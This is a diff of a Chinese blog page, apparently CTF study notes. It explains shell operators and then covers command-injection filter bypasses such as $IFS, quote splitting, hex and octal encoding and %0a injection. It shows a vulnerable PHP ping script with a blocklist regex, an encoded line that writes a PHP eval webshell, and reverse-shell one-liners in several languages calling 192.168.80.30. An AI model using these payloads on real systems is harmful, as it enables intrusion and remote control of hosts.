+<li><p><strong>功能</strong>: 分号用于将多个命令串联在同一行中依次执行，不论前面的命令是否执行成功，后续命令都会被执行。这对于希望在一条命令链中连续执行多个独立的命令时非常有用。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>
+
+<p>在此示例中，无论<code>command1</code>是否成功执行，<code>command2</code>都会被执行。这种方式适用于不考虑前置命令结果的顺序执行。</p>
+</li>
+</ul>
+<p><strong>2. 单与符 (<code>&amp;</code>) 用法</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 单与符用于将命令放入后台执行。后台执行的命令不会占用当前终端，允许用户继续在终端输入其他命令。这在需要长时间运行的任务时非常有用，可以让用户继续其他工作。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>此命令会将<code>command1</code>放在后台执行，执行后用户可以继续在终端输入新的命令而不需等待<code>command1</code>完成。</p>
+</li>
+</ul>
+<p><strong>3. 双与符 (<code>&amp;&amp;</code>) 用法</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 双与符用于条件执行，即仅在前一个命令成功（返回值为<code>0</code>）时，才执行后一个命令。这种逻辑“与”操作符适用于需要根据前置命令的结果来决定是否继续执行后续命令的场景。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2</span><br></pre></td></tr></table></figure>
+
+<p>仅当<code>command1</code>执行成功（返回值为<code>0</code>）时，<code>command2</code>才会被执行。如果<code>command1</code>失败，则<code>command2</code>不会执行。</p>
+</li>
+</ul>
+<p><strong>4. 管道符 (<code>|</code>) 用法</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 管道符用于将一个命令的输出直接作为下一个命令的输入。它常用于需要对数据进行多步处理的场景，将多个命令串联起来进行数据的流式处理。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>command1</code>的输出将被直接传递给<code>command2</code>作为输入。典型的用例包括从一个命令的输出中过滤数据，并将结果传递给下一个命令处理。</p>
+</li>
+</ul>
+<p><strong>5. 双管道符 (<code>||</code>) 用法</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 双管道符用于条件执行，即仅在前一个命令失败（返回值非<code>0</code>）时，才执行下一个命令。这种逻辑“或”操作符常用于尝试执行替代操作或处理错误情况。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，只有当<code>command1</code>失败（返回值非<code>0</code>）时，<code>command2</code>才会被执行。如果<code>command1</code>成功，<code>command2</code>将被跳过。</p>
+</li>
+</ul>
+<p><strong>6. 重定向操作符 (<code>&gt;</code>, <code>&lt;</code>, <code>&gt;&gt;</code>)</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 重定向操作符用于将命令的输出或输入重定向到文件或从文件中读取。它们可以控制命令执行时的数据流动方向。</p>
+<ul>
+<li><code>&gt;</code>: 将命令的输出重定向到指定文件，如果文件已存在则覆盖。</li>
+<li><code>&lt;</code>: 将指定文件的内容重定向为命令的输入。</li>
+<li><code>&gt;&gt;</code>: 将命令的输出追加到指定文件的末尾，如果文件不存在则创建文件。</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command1 &gt; output.txt</span><br><span class="line">command1 &lt; input.txt</span><br><span class="line">command1 &gt;&gt; output.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第一行示例中，<code>command1</code>的输出被写入<code>output.txt</code>，覆盖原有内容。</li>
+<li>第二行示例中，<code>input.txt</code>的内容被作为<code>command1</code>的输入。</li>
+<li>第三行示例中，<code>command1</code>的输出被追加到<code>output.txt</code>的末尾。</li>
 </ul>
 </li>
 </ul>
+<p><strong>7.反引号 (<code> </code>command2<code> </code>) 和美元符 (<code>$(command2)</code>)</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 反引号和美元符都用于将命令的执行结果嵌入到另一个命令中。两者功能相似，但反引号是传统语法，而美元符则是更现代的语法，支持嵌套执行。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo `command2`</span><br><span class="line">echo $(command2)</span><br></pre></td></tr></table></figure>
+
+<p>在这两行示例中，<code>command2</code>的执行结果将被插入到<code>echo</code>命令中，并在终端打印出来。</p>
+</li>
+</ul>
+<p><strong>8. <code>$()</code> 用法</strong></p>
+<ul>
+<li><p><strong>功能</strong>: <code>$()</code> 用于命令替换，将括号内的命令输出作为外部命令的参数。相比于反引号，它支持更复杂的嵌套，且语法更清晰。此方式广泛用于脚本编写和命令组合中。</p>
+</li>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(date)</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>$(date)</code> 被替换为当前日期和时间的字符串，然后被传递给 <code>echo</code> 命令，输出当前日期和时间。</p>
+</li>
+</ul>
+<p><strong>9. <code>-</code> 用法</strong></p>
+<ul>
+<li><p><strong>功能</strong>: 破折号 <code>-</code> 用于在命令中表示选项或参数，通常用于修改命令的行为或指定额外操作。这种用法广泛应用于命令行工具中，使用户能够定制命令的执行方式。</p>
+<p><strong>用法示例</strong>:</p>
+<ol>
+<li><p><strong>短选项（Single-Dash Options）</strong>:</p>
+<p>破折号 <code>-</code> 通常用于表示短选项或标志。这些选项用于改变命令的默认行为。</p>
+<ul>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p>这里，<code>-l</code> 是 <code>ls</code> 命令的短选项，表示以长格式显示文件信息。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>参数标志（Flag Parameters）</strong>:</p>
+<p>在某些命令中，破折号 <code>-</code> 也可以用来表示特定的参数标志。</p>
+<ul>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -i &#x27;pattern&#x27; file.txt</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>-i</code> 是 <code>grep</code> 命令的选项，用于忽略大小写匹配。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>作为文件名的占位符</strong>:</p>
+<p>破折号 <code>-</code> 有时作为特殊文件名占位符，表示从标准输入读取或将数据写入标准输出。</p>
+<ul>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat - &gt; output.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里，<code>cat -</code> 表示从标准输入读取数据，并将其写入到 <code>output.txt</code> 文件中。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>长选项（Double-Dash Options）</strong>:</p>
+<p>虽然您提到的是短横线 <code>-</code>，有时也会遇到双破折号 <code>--</code> 用于长选项，这些选项提供了更具描述性的功能。</p>
+<ul>
+<li><p><strong>示例</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep --ignore-case &#x27;pattern&#x27; file.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里，<code>--ignore-case</code> 是 <code>grep</code> 命令的长选项，与 <code>-i</code> 选项功能相同，但更具描述性。</p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h3><p>常见的类似于<code>str_replace(&#39;flag&#39;,&#39;&#39;)</code>的过滤我们可以使用双写绕过。<code>flflagag</code>把中间的flag替换为空之后还是flag。</p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>一些命令，像<code>cat /flag</code>是一定要用到空格的，如果没法输入空格就会导致我们没法执行命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%<span class="number">09</span>(tab)、%<span class="number">20</span>、$IFS$<span class="number">9</span>、$IFS$<span class="number">1</span>、$&#123;IFS&#125;、<span class="variable">$IFS</span>等，还可以用&#123;&#125; 比如 &#123;cat,flag&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</strong></p>
+</blockquote>
+<p>还有一些编码绕过或者编码后在<code>&#123;&#125;</code>中的也可以通过<code>&#123;,&#125;</code>绕过空格</p>
+<h3 id="过滤关键字，如过滤-cat，flag等关键字"><a href="#过滤关键字，如过滤-cat，flag等关键字" class="headerlink" title="过滤关键字，如过滤 cat，flag等关键字"></a>过滤关键字，如过滤 cat，flag等关键字</h3><p><strong>替代法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261 //报错出文件内容</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">读取文件命令</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>more flag.txt</code></td>
+<td align="left">一页一页显示文件内容</td>
+</tr>
+<tr>
+<td align="left"><code>less flag.txt</code></td>
+<td align="left">与more命令不同的是, more命令只能往后翻页, 而less命令往前往后都可以</td>
+</tr>
+<tr>
+<td align="left"><code>head flag.txt</code></td>
+<td align="left">显示文件内容前几行</td>
+</tr>
+<tr>
+<td align="left"><code>tac flag.txt</code></td>
+<td align="left">tac与cat命令刚好相反，文件内容从最后一行开始显示</td>
+</tr>
+<tr>
+<td align="left"><code>tail flag.txt</code></td>
+<td align="left">显示文件内容后几行</td>
+</tr>
+</tbody></table>
+<p><strong>变量拼接关键字</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=ca;b=t;$a$b flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>单双引号拼接关键字</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca&#x27;t&#x27; flag.txt</span><br><span class="line">c&quot;&quot;at flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>反斜杠拼接关键字</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>$num</code>和<code>$@</code>拼接关键字</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c$1at fl$@ag.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤分号"><a href="#过滤分号" class="headerlink" title="过滤分号"></a>过滤分号</h3><p>过滤分号的时候我们可以通过?&gt;闭合来使我们的命令执行，然后可以使用include””包含，而且不用双引号也可以，执行一些我们的命令。</p>
+<p>但是我们可以发现这个时候是不会回显的，我们可以结合伪协议来进行回显的读取。</p>
+<h3 id="利用编码绕过敏感字符"><a href="#利用编码绕过敏感字符" class="headerlink" title="利用编码绕过敏感字符"></a>利用编码绕过敏感字符</h3><p><strong>URL编码绕过</strong></p>
+<p>关于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，它<strong>验证的时候</strong>是不会进行url解码的，但是在GET的时候则会进行url解码，所以我们只需要将关键词进行url编码就能绕过。</p>
+<p>这里涉及到这个<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，属于PHP中<code>$_SERVER</code>这个全局变量的一种，</p>
+<p><strong>BASE64编码绕过</strong></p>
+<p>linux下base64命令用法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base64 [选项]… [文件]</span><br><span class="line">使用 Base64 编码/解码文件或标准输入/输出。</span><br><span class="line">-d, --decode 解码数据</span><br><span class="line">-w, --wrap=字符数 在指定的字符数后自动换行(默认为<span class="number">76</span>)，<span class="number">0</span> 为禁用自动换行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo test|base64             加密</span><br><span class="line">dGVzdAo=</span><br><span class="line">[root@localhost ~]# echo dGVzdAo= |base64 -d     解密 </span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+
+<p>利用时要结合管道符</p>
+<p><strong>Hex编码绕过</strong></p>
+<p>道理其实与上面base相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot;|xxd -r -p|bash     将执行cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>利用linux <strong>xxd</strong>命令。xxd 命令可以将指定文件或标准输入以十六进制转储，也可以把十六进制转储转换成原来的二进制形式。</p>
+<p>也可以用 <code>$()</code> 的形式直接内联执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;)         执行cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0       执行cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>Oct编码绕过</strong></p>
+<p>和上面这种hex类似，也是利用的printf和内联执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;)       执行ls</span><br></pre></td></tr></table></figure>
+
+<p>可以通过这样来写webshell，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// &lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;: $&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br><span class="line">    </span><br><span class="line">// 需要有写权限</span><br></pre></td></tr></table></figure>
+
+<h3 id="用-0a-绕过命令连接符"><a href="#用-0a-绕过命令连接符" class="headerlink" title="用 %0a 绕过命令连接符"></a>用 %0a 绕过命令连接符</h3><p>当题目代码将一下字符全部过滤后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ $    &#123;    &#125;    `    ;    &amp;    |    (    )    \     &#x27;    ~    !    @    #    %    ^    *    [    ]    \\    :    -    _ ]</span><br></pre></td></tr></table></figure>
+
+<p>我们可以用 %0a 进行绕过，%0a 代表换行的意思，通过 %0a 能够注入新的一条命令进行执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1%0als</span><br><span class="line">?ip=127.0.0.1%0acat /flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="花括号-command-的别样用法"><a href="#花括号-command-的别样用法" class="headerlink" title="花括号{command,}的别样用法"></a>花括号{command,}的别样用法</h3><p>在Linux bash中还可以使用花括号<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令。</p>
+<p><strong>注意：别忘了{,}里面的逗号，如{ls}这个不能执行，必须要{ls,}这样。</strong></p>
+<h3 id="用内联执行绕过关键字过滤"><a href="#用内联执行绕过关键字过滤" class="headerlink" title="用内联执行绕过关键字过滤"></a>用内联执行绕过关键字过滤</h3><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的反引号作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。linux下反引号&#96;&#96;里面包含的就是需要执行的系统命令，而反引号里面的系统命令会先执行，成功执行后将结果传递给调用它的命令(就是将反引号内命令的输出作为输入执行)，类似于|管道</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br></pre></td></tr></table></figure>
+
+<p>于此类似的还有<code>$(command)</code></p>
+<p>例如：<code>echo &quot;abcd $(pwd)&quot;</code></p>
+<h3 id="用引号绕过关键字过滤"><a href="#用引号绕过关键字过滤" class="headerlink" title="用引号绕过关键字过滤"></a>用引号绕过关键字过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(;|&#x27;| |&gt;|&amp;| |\\$|python|sh|nc|tac|rev|more|tailf|index|php|head|nl|tail|less|cat|ruby|perl|bash|rm|cp|mv|\&#123;)/i&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no no no!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=&#x27;javascript&#x27; type=&#x27;text/javascript&#x27;&gt;</span></span><br><span class="line"><span class="string">      alert(&#x27;no flag!&#x27;)</span></span><br><span class="line"><span class="string">      window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码中绕过了cat、more、index、php等关键字，我们可以用引号绕过这些过滤，实例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca&quot;&quot;t  =&gt;  cat</span><br><span class="line">mo&quot;&quot;re  =&gt;  more  </span><br><span class="line">in&quot;&quot;dex  =&gt;  index</span><br><span class="line">ph&quot;&quot;p  =&gt;  php</span><br></pre></td></tr></table></figure>
+
+<h3 id="用通配符绕过关键字过滤"><a href="#用通配符绕过关键字过滤" class="headerlink" title="用通配符绕过关键字过滤"></a>用通配符绕过关键字过滤</h3><p>可以看到，题目使用 preg_match(“&#x2F;.*f.*l.*a.<em>g.</em>&#x2F;“, $ip) 过滤了flag，那么我们读取flag时就可以用以下方法绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">假设flag在/flag中:</span><br><span class="line">/?url=127.0.0.1|ca&quot;&quot;t%09/fla?</span><br><span class="line">/?url=127.0.0.1|ca&quot;&quot;t%09/fla*</span><br><span class="line">    </span><br><span class="line">假设flag在/flag.txt中:</span><br><span class="line">/?url=127.0.0.1|ca&quot;&quot;t%09/fla????</span><br><span class="line">/?url=127.0.0.1|ca&quot;&quot;t%09/fla*</span><br><span class="line">    </span><br><span class="line">假设flag在/flags/flag.txt中:</span><br><span class="line">/?url=127.0.0.1|ca&quot;&quot;t%09/fla??/fla????</span><br><span class="line">/?url=127.0.0.1|ca&quot;&quot;t%09/fla*/fla*</span><br><span class="line">我们可以用以上格式的payload读取到flag。</span><br></pre></td></tr></table></figure>
+
+<p>下面说一下原理：</p>
+<p>在正则表达式中，?这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或一次。<br>在shell命令行中，? 这样的通配符与其它字符一起组合成表达式，匹配任意一个字符。<br>同理，我们可以知道 * 通配符：</p>
+<p>在正则表达式中，<em>这样的通配符与其它字符一起组合成表达式，匹配前面的字符或表达式零次或多次。<br>在shell命令行中，</em> 这样的通配符与其它字符一起组合成表达式，匹配任意长度的字符串。这个字符串的长度可以是0，可以是1，可以是任意数字。</p>
+<h3 id="用反斜杠绕过关键字过滤"><a href="#用反斜杠绕过关键字过滤" class="headerlink" title="用反斜杠绕过关键字过滤"></a>用反斜杠绕过关键字过滤</h3><p>我们还可以利用反斜杠绕过关键字过滤，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca\t  =&gt;  cat</span><br><span class="line">mo\re  =&gt;  more  </span><br><span class="line">in\dex  =&gt;  index</span><br><span class="line">ph\p  =&gt;  php</span><br><span class="line">n\l  =&gt;  nl</span><br></pre></td></tr></table></figure>
+
+<h3 id="用-匹配绕过关键字过滤"><a href="#用-匹配绕过关键字过滤" class="headerlink" title="用[]匹配绕过关键字过滤"></a>用[]匹配绕过关键字过滤</h3><p>同样还是上面那个示例代码，我们可以用[]匹配绕过关键字过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c[a]t  =&gt;  cat</span><br><span class="line">mo[r]e  =&gt;  more  </span><br><span class="line">in[d]ex  =&gt;  index</span><br><span class="line">p[h]p  =&gt;  php</span><br></pre></td></tr></table></figure>
+
+<h2 id="反向连接（Reverse-Shell）的各类技术方法"><a href="#反向连接（Reverse-Shell）的各类技术方法" class="headerlink" title="反向连接（Reverse Shell）的各类技术方法"></a>反向连接（Reverse Shell）的各类技术方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- rm/tmp/f; mkfifo/tmp/f; cat /tmp/f|/bin/sh-i2&gt;&amp;1|nc 192.168.80.30 443 &gt;/tmp/f</span><br><span class="line">- perl-e &#x27;use Socket;$i=&quot;192.168.80.30&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh-i&quot;);&#125;;&#x27;</span><br><span class="line">- python-c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.30&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">- php-r &#x27;$sock=fsockopen(&quot;192.168.80.30&quot;,443);exec(&quot;/bin/sh-i&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);’</span><br><span class="line">- ruby-rsocket-e&#x27;f=TCPSocket.open(&quot;192.168.80.30&quot;,443).to_i;execsprintf(&quot;/bin/sh-i&lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/hack_tools.png" class="lazyload" data-srcset="https://gcore.jsdelivr.net/gh/mujietongxue/blogcdn@main/img/hack_tools.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="hack_tools"></p>
+<p>这个浏览器插件挺好用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://chromewebstore.google.com/detail/cmbndhnoonmghfofefkcccljbkdpamhi</span><br></pre></td></tr></table></figure>
+
+<h2 id="一些框架漏洞"><a href="#一些框架漏洞" class="headerlink" title="一些框架漏洞"></a>一些框架漏洞</h2><ol>
+<li>Thinkphp rce </li>
+<li>Log4j2 </li>
+<li>Fastjson反序列化 </li>
+<li>Weblogic </li>
+<li>Imagemagick组件rce(CVE-2016-3714 ) </li>
+<li>GhostScript Rce </li>
+<li>Shiro Struts2</li>
+</ol>
+<p>rce的总结可以看这篇文章</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/9628  </span><br></pre></td></tr></table></figure>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>文件上传重命名</strong></p>
+<p>当上传一个文件的时候如果有参数更改文件名的时候，就要想到是不是调用cmd去重置文件名  </p>
+<p><strong>数组可控导致的RCE</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/10391</span><br></pre></td></tr></table></figure>
+
+<p><strong>ping命令导致rce</strong></p>
+<p><strong>播放文件导致rce</strong></p>
+<p><strong>pdf.js 进行命令执行</strong></p>
 
   </div>
   
@@ -2522,10 +2999,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-07-23T22:52:02+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-08-28T23:05:56+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jul 23, 2024</p>
+    <p>更新于：Aug 28, 2024</p>
   </a>
 </div>
 
@@ -2534,8 +3011,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/test/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>test</p></a></div>
-  <span hidden itemprop="keywords">test</span>
